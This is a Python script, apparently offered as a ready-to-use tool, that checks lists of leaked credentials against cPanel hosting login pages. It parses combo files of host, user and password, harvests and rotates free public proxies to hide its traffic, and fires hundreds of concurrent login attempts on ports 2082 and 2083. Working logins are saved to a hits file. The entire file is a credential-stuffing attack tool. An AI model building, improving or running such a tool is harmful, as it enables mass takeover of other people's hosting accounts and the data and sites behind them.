#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cpanel_reliable_checker.py - Auto Proxy + Ultra Fast Async Checker for GHA
Version: 4.0.0
Author: VEXX
Features:
- Auto-fetch proxies from ProxyScrape, TheSpys, Geonode
- Proxy validation & rotation
- Async concurrency up to 500 tasks
- Handles 40k+ combos without skipping
- Full credential extraction from any line format
"""

import sys
import os
import re
import time
import json
import asyncio
import aiohttp
import random
import logging
import argparse
from datetime import datetime
from urllib.parse import urlparse

# -------------------- CONFIGURATION --------------------
DEFAULT_TIMEOUT = 8
DEFAULT_CONCURRENCY = 300
HIT_FILE = "hit.txt"
FAIL_LOG = "fail.log"
PROXY_FILE = "proxies_auto.txt"
COMBO_FILE = "combo.txt"
TEST_URL = "http://httpbin.org/ip"

logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# -------------------- PROXY FETCHERS --------------------
async def fetch_proxyscrape(session):
    """Fetch HTTP proxies from ProxyScrape (free)"""
    urls = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000"
    ]
    proxies = set()
    for url in urls:
        try:
            async with session.get(url, timeout=10) as resp:
                text = await resp.text()
                for line in text.splitlines():
                    line = line.strip()
                    if line and ':' in line:
                        proxies.add(line)
        except:
            pass
    return list(proxies)

async def fetch_geonode(session):
    """Fetch from Geonode free proxy list"""
    url = "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps"
    proxies = set()
    try:
        async with session.get(url, timeout=10) as resp:
            data = await resp.json()
            for item in data.get('data', []):
                ip = item.get('ip')
                port = item.get('port')
                if ip and port:
                    proxies.add(f"{ip}:{port}")
    except:
        pass
    return list(proxies)

async def fetch_thespys(session):
    """Fetch from TheSpys.life - requires parsing HTML table"""
    url = "https://spys.one/en/free-proxy-list/"
    proxies = set()
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
    try:
        async with session.get(url, headers=headers, timeout=15) as resp:
            html = await resp.text()
            # Extract IP:PORT from table rows (simplified regex)
            rows = re.findall(r'<tr>.*?<td.*?>(\d+\.\d+\.\d+\.\d+)</td>.*?<td.*?>(\d+)</td>', html, re.DOTALL)
            for ip, port in rows:
                proxies.add(f"{ip}:{port}")
    except:
        pass
    return list(proxies)

async def fetch_all_proxies():
    """Collect proxies from all sources"""
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [
            fetch_proxyscrape(session),
            fetch_geonode(session),
            fetch_thespys(session)
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        all_proxies = set()
        for res in results:
            if isinstance(res, list):
                all_proxies.update(res)
        return list(all_proxies)

async def validate_proxy(session, proxy, test_url=TEST_URL, timeout=5):
    """Test if proxy works"""
    try:
        async with session.get(test_url, proxy=f"http://{proxy}", timeout=timeout, ssl=False) as resp:
            if resp.status == 200:
                return proxy
    except:
        pass
    return None

async def get_working_proxies(proxy_list, limit=50):
    """Filter working proxies, return list"""
    connector = aiohttp.TCPConnector(ssl=False, limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [validate_proxy(session, p) for p in proxy_list[:200]]  # test first 200
        results = await asyncio.gather(*tasks)
    working = [p for p in results if p]
    return working[:limit] if len(working) > limit else working

# -------------------- CREDENTIAL EXTRACTION (original, enhanced) --------------------
def extract_credentials(line):
    raw = line.strip()
    if not raw or len(raw) < 6:
        return None
    if '@' in raw and ':' in raw.split('@')[0]:
        left, right = raw.rsplit('@', 1)
        if ':' in left:
            user, pwd = left.split(':', 1)
            return right, user, pwd
    if '|' in raw:
        parts = raw.split('|')
        if len(parts) >= 3:
            return parts[0], parts[1], '|'.join(parts[2:])
    if raw.count(':') == 2 and '://' not in raw:
        parts = raw.split(':')
        if len(parts) == 3:
            return parts[0], parts[1], parts[2]
    url_match = re.search(r'(https?://[^/\s]+(?::\d+)?)', raw)
    if url_match:
        url = url_match.group(1)
        rest = raw[url_match.end():].strip()
        tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
        if len(tokens) >= 2:
            return url, tokens[0], tokens[1]
    domain_match = re.search(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?::\d+)?', raw)
    if domain_match:
        domain = domain_match.group(1)
        rest = raw[domain_match.end():].strip()
        tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
        if len(tokens) >= 2:
            return f"http://{domain}", tokens[0], tokens[1]
    return None

def normalize_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    if not re.search(r':\d+', url):
        if url.startswith('https'):
            url += ':2083'
        else:
            url += ':2082'
    return url.rstrip('/')

def read_combo_file(filepath):
    combos = []
    encodings = ['utf-8', 'latin-1', 'cp1252']
    for enc in encodings:
        try:
            with open(filepath, 'r', encoding=enc, errors='ignore') as f:
                lines = f.readlines()
            break
        except UnicodeDecodeError:
            continue
    else:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    for line in lines:
        creds = extract_credentials(line)
        if creds:
            combos.append(creds)
    return combos

# -------------------- ASYNC LOGIN CHECKER --------------------
async def check_login(session, url, user, pwd, timeout, proxy=None):
    url = normalize_url(url)
    login_url = f"{url}/login/?login_only=1"
    data = {'user': user, 'pass': pwd, 'goto_uri': '/'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection': 'keep-alive'
    }
    proxy_url = f"http://{proxy}" if proxy else None
    try:
        async with session.post(login_url, data=data, headers=headers,
                                timeout=aiohttp.ClientTimeout(total=timeout),
                                proxy=proxy_url, ssl=False) as resp:
            text = await resp.text()
            if resp.status == 200 and ('security_token' in text or 'cpsess' in text):
                return True, url
            return False, None
    except Exception:
        return False, None

async def worker(sem, session, combo, timeout, proxy_list, stats, hits, lock, idx, all_combos):
    url, user, pwd = combo
    async with sem:
        proxy = random.choice(proxy_list) if proxy_list else None
        success, final_url = await check_login(session, url, user, pwd, timeout, proxy)
        async with lock:
            if success:
                stats['hits'] += 1
                hits.append(f"{user}:{pwd}@{final_url}\n")
            else:
                stats['fails'] += 1
            stats['total'] += 1
        return success, final_url, user, pwd, idx

async def run_async(combos, proxy_list, concurrency, timeout):
    sem = asyncio.Semaphore(concurrency)
    connector = aiohttp.TCPConnector(limit=concurrency, limit_per_host=concurrency, ssl=False, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        stats = {'hits': 0, 'fails': 0, 'total': 0}
        hits = []
        lock = asyncio.Lock()
        tasks = []
        for idx, combo in enumerate(combos):
            tasks.append(asyncio.create_task(worker(sem, session, combo, timeout, proxy_list, stats, hits, lock, idx, combos)))
        
        total = len(combos)
        start = time.time()
        for i, task in enumerate(asyncio.as_completed(tasks), 1):
            await task
            if i % 500 == 0 or i == total:
                elapsed = time.time() - start
                rate = i / elapsed if elapsed > 0 else 0
                sys.stdout.write(f"\rProgress: {i}/{total} ({i/total*100:.1f}%) | Hits: {stats['hits']} | Rate: {rate:.1f} cps")
                sys.stdout.flush()
        sys.stdout.write("\n")
        return stats['hits'], hits

# -------------------- MAIN --------------------
async def main_async():
    parser = argparse.ArgumentParser(description="cPanel Checker - Auto Proxy + Async")
    parser.add_argument("-f", "--file", default=COMBO_FILE, help="Input combo file")
    parser.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY, help="Concurrent tasks")
    parser.add_argument("-t", "--timeout", type=int, default=DEFAULT_TIMEOUT, help="Request timeout")
    parser.add_argument("--no-proxy-fetch", action="store_true", help="Skip auto proxy fetch")
    parser.add_argument("--proxy-file", help="Use static proxy file instead of auto-fetch")
    args = parser.parse_args()
    
    input_file = args.file
    if not os.path.exists(input_file):
        print(f"[!] File not found: {input_file}")
        sys.exit(1)
    
    print("[*] Loading combos...")
    combos = read_combo_file(input_file)
    if not combos:
        print("[!] No valid combos extracted.")
        sys.exit(1)
    print(f"[+] Loaded {len(combos)} combos.")
    
    # Get proxies
    proxy_list = []
    if args.proxy_file and os.path.exists(args.proxy_file):
        with open(args.proxy_file, 'r') as f:
            proxy_list = [line.strip() for line in f if line.strip()]
        print(f"[+] Loaded {len(proxy_list)} proxies from file.")
    elif not args.no_proxy_fetch:
        print("[*] Fetching proxies from ProxyScrape, Geonode, TheSpys...")
        all_proxies = await fetch_all_proxies()
        print(f"[+] Raw proxies: {len(all_proxies)}")
        if all_proxies:
            print("[*] Validating proxies (may take a moment)...")
            proxy_list = await get_working_proxies(all_proxies, limit=100)
            print(f"[+] Working proxies: {len(proxy_list)}")
            # Save for future runs
            with open(PROXY_FILE, 'w') as f:
                f.write('\n'.join(proxy_list))
    else:
        print("[!] No proxies provided. Running without proxies.")
    
    # Run checker
    print(f"[*] Starting async checker with concurrency {args.concurrency}...")
    hits_count, hits_lines = await run_async(combos, proxy_list, args.concurrency, args.timeout)
    
    # Write results
    if hits_lines:
        with open(HIT_FILE, 'w', encoding='utf-8') as f:
            f.writelines(hits_lines)
        print(f"\n[+] Hits: {hits_count} saved to {HIT_FILE}")
        for line in hits_lines[:10]:  # show first 10
            print(f"  {line.strip()}")
    else:
        print("\n[-] No hits found.")
    
    print(f"[*] Total combos processed: {len(combos)}")
    print(f"[*] Done.")

def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()